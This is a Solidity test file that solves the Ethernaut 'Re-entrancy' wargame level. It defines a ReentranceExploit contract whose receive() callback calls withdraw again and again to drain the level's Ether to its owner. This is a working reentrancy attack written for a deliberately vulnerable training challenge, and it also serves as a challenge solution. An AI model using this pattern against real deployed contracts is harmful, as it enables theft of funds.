// SPDX-License-Identifier: MIT
pragma solidity ^0.8.2;

import {Ethernaut} from "../game/Ethernaut.sol";
import {Reentrance} from "../levels/Re-entrancy/Reentrance.sol";
import {ReentranceFactory} from "../levels/Re-entrancy/ReentranceFactory.sol";
import {LevelTest} from "./common/LevelTest.sol";

contract ReentranceTest is LevelTest {
    Reentrance private level;

    constructor() {
        levelFactory = new ReentranceFactory();
    }

    function testReentrancy() public {
        run();
    }

    function init() internal override {
        levelAddress = payable(this.create{value: 1 ether}());
        level = Reentrance(levelAddress);
    }

    function exploit() internal override {
        vm.startPrank(player);

        ReentranceExploit expl = new ReentranceExploit(level);
        uint256 donation = address(level).balance / 10;

        expl.run{value: donation}();
        expl.withdraw();

        vm.stopPrank();
    }
}

contract ReentranceExploit {
    Reentrance private immutable level;
    address private immutable owner;

    constructor(Reentrance _level) {
        level = _level;
        owner = msg.sender;
    }

    function withdraw() public {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "unable to withdraw");
    }

    function run() public payable {
        // Donate some Ether so we can withdraw them back
        level.donate{value: msg.value}(address(this));
        // Calling withdraw will tigger the chain of withdraw-receive calls
        level.withdraw(msg.value);
    }

    receive() external payable {
        uint256 levelBalance = address(level).balance;
        if (levelBalance > 0) {
            if (msg.value < levelBalance) {
                level.withdraw(msg.value);
            } else {
                level.withdraw(levelBalance);
            }
        }
    }
}
